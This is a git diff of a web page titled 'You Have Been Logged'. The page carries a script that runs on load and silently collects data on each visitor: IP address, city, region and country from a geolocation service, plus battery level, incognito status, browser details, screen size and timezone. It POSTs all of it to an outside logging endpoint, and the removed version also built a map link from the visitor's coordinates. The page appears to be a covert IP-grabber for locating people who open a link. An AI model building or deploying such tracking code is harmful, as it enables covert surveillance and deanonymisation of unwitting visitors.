@@ -1,6 +1,7 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8" />
   <title>You Have Been Logged</title>
 </head>
 <body>
@@ -8,52 +9,55 @@
 
   <script>
   (async () => {
-    const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
-    const battery = await navigator.getBattery?.();
-    const batteryLevel = battery ? `${Math.round(battery.level * 100)}%` : "Unknown";
-
-    // Detect incognito (simple check)
-    let incognito = "Unknown";
     try {
-      window.RequestFileSystem || window.webkitRequestFileSystem
-        ? window.webkitRequestFileSystem(
-            window.TEMPORARY,
-            100,
-            () => (incognito = "No"),
-            () => (incognito = "Yes")
-          )
-        : (incognito = "Not detectable");
-    } catch {
-      incognito = "Not detectable";
+      const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
+
+      const battery = await (navigator.getBattery?.() || Promise.resolve(null));
+      const batteryLevel = battery ? `${Math.round(battery.level * 100)}%` : "Unknown";
+
+      let incognito = "Unknown";
+      try {
+        window.RequestFileSystem || window.webkitRequestFileSystem
+          ? window.webkitRequestFileSystem(
+              window.TEMPORARY,
+              100,
+              () => (incognito = "No"),
+              () => (incognito = "Yes")
+            )
+          : (incognito = "Not detectable");
+      } catch {
+        incognito = "Not detectable";
+      }
+
+      const visitorData = {
+        ip: ipData.ip || "Unknown",
+        city: ipData.city || "Unknown",
+        region: ipData.region || "Unknown",
+        country: ipData.country_name || "Unknown",
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        screenSize: `${screen.width}x${screen.height}`,
+        url: location.href,
+        platform: navigator.platform,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        localTime: new Date().toString(),
+        battery: batteryLevel,
+        incognito,
+      };
+
+      // Change this URL to your deployed Vercel API URL
+      const backendURL = "https://dontlarp153-github-io-pi.vercel.app/api/log";
+
+      await fetch(backendURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(visitorData),
+      });
+
+      console.log("Visitor data sent to backend.");
+    } catch (error) {
+      console.error("Failed to send visitor data:", error);
     }
-
-    const browser = navigator.userAgent.includes("Chrome") ? "Chrome" :
-                    navigator.userAgent.includes("Firefox") ? "Firefox" :
-                    navigator.userAgent.includes("Safari") ? "Safari" : "Other";
-
-    const visitorData = {
-      ip: ipData.ip || "Unknown",
-      city: ipData.city || "Unknown",
-      region: ipData.region || "Unknown",
-      country: ipData.country_name || "Unknown",
-      userAgent: navigator.userAgent,
-      browser,
-      language: navigator.language,
-      screenSize: `${screen.width}x${screen.height}`,
-      url: location.href,
-      platform: navigator.platform,
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      localTime: new Date().toString(),
-      battery: batteryLevel,
-      incognito,
-      map: `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`
-    };
-
-    await fetch("https://dontlarp153-github-io-pi.vercel.app/api/log", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(visitorData),
-    });
   })();
   </script>
 </body>
